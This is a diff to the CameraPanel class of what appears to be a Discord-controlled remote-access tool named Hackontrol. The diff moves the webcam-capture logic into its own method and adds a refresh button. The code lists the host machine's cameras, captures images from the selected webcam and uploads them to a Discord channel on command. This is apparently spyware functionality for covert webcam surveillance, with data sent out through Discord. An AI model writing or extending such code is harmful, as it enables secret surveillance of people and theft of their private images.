@@ -12,6 +12,7 @@ import com.khopan.hackontrol.service.interaction.ButtonManager;
 import com.khopan.hackontrol.service.interaction.ButtonManager.ButtonType;
 import com.khopan.hackontrol.service.interaction.InteractionManager;
 import com.khopan.hackontrol.service.interaction.ModalManager;
+import com.khopan.hackontrol.service.interaction.context.ButtonContext;
 import com.khopan.hackontrol.utils.HackontrolError;
 import com.khopan.hackontrol.utils.HackontrolMessage;
 import com.khopan.hackontrol.utils.TimeSafeReplyHandler;
@@ -30,9 +31,10 @@ import net.dv8tion.jda.api.utils.messages.MessageCreateBuilder;
 public class CameraPanel extends Panel {
 	private static final String PANEL_NAME = "camera";
 
-	private static final Button BUTTON_CAMERA_LIST = ButtonManager.staticButton(ButtonType.SUCCESS, "Camera List", "cameraList");
-	private static final Button BUTTON_CAPTURE     = ButtonManager.staticButton(ButtonType.SUCCESS, "Capture",     "cameraCapture");
-	private static final Button BUTTON_REFRESH     = ButtonManager.staticButton(ButtonType.SUCCESS, "Refresh",     "cameraRefresh");
+	private static final Button BUTTON_CAMERA_LIST     = ButtonManager.staticButton(ButtonType.SUCCESS, "Camera List", "cameraList");
+	private static final Button BUTTON_CAPTURE         = ButtonManager.staticButton(ButtonType.SUCCESS, "Capture",     "cameraCapture");
+	private static final Button BUTTON_REFRESH         = ButtonManager.staticButton(ButtonType.SUCCESS, "Refresh",     "cameraRefresh");
+	private static final Button BUTTON_CAPTURE_REFRESH = ButtonManager.staticButton(ButtonType.SUCCESS, "Refresh",     "cameraCaptureRefresh");
 
 	private Camera[] cameraList;
 	private Camera selected;
@@ -44,30 +46,19 @@ public class CameraPanel extends Panel {
 
 	@Override
 	public void registeration() {
-		this.register(Registration.BUTTON, CameraPanel.BUTTON_CAMERA_LIST, context -> {
+		this.register(Registration.BUTTON, CameraPanel.BUTTON_CAMERA_LIST,     context -> {
 			this.cameraList = Camera.list();
 			this.send(context);
 		});
 
-		this.register(Registration.BUTTON, CameraPanel.BUTTON_CAPTURE,     context -> {
-			if(this.selected == null) {
-				HackontrolError.message(context.reply(), "No camera selected");
-				return;
-			}
-
-			TimeSafeReplyHandler.start(context, consumer -> {
-				try {
-					ByteArrayOutputStream stream = new ByteArrayOutputStream();
-					ImageIO.write(this.selected.capture(), "png", stream);
-					consumer.accept(new MessageCreateBuilder().setFiles(FileUpload.fromData(stream.toByteArray(), ScreenshotPanel.getFileName("capture"))).addActionRow(CameraPanel.BUTTON_CAPTURE, HackontrolButton.delete()).build());
-				} catch(Throwable Errors) {
-					HackontrolError.throwable(ConsumerMessageCreateDataSendable.of(consumer), Errors);
-				}
-			});
+		this.register(Registration.BUTTON, CameraPanel.BUTTON_CAPTURE,         this :: capture);
+		this.register(Registration.BUTTON, CameraPanel.BUTTON_REFRESH,         context -> {
+			this.send(context);
+			HackontrolMessage.delete(context);
 		});
 
-		this.register(Registration.BUTTON, CameraPanel.BUTTON_REFRESH,     context -> {
-			this.send(context);
+		this.register(Registration.BUTTON, CameraPanel.BUTTON_CAPTURE_REFRESH, context -> {
+			this.capture(context);
 			HackontrolMessage.delete(context);
 		});
 	}
@@ -175,5 +166,22 @@ public class CameraPanel extends Panel {
 		list.add(CameraPanel.BUTTON_REFRESH);
 		list.add(HackontrolButton.delete());
 		callback.reply(builder.toString()).addActionRow(list).queue(InteractionManager :: callback);
+	}
+
+	private void capture(ButtonContext context) {
+		if(this.selected == null) {
+			HackontrolError.message(context.reply(), "No camera selected");
+			return;
+		}
+
+		TimeSafeReplyHandler.start(context, consumer -> {
+			try {
+				ByteArrayOutputStream stream = new ByteArrayOutputStream();
+				ImageIO.write(this.selected.capture(), "png", stream);
+				consumer.accept(new MessageCreateBuilder().setFiles(FileUpload.fromData(stream.toByteArray(), ScreenshotPanel.getFileName("capture"))).addActionRow(CameraPanel.BUTTON_CAPTURE, CameraPanel.BUTTON_CAPTURE_REFRESH, HackontrolButton.delete()).build());
+			} catch(Throwable Errors) {
+				HackontrolError.throwable(ConsumerMessageCreateDataSendable.of(consumer), Errors);
+			}
+		});
 	}
 }
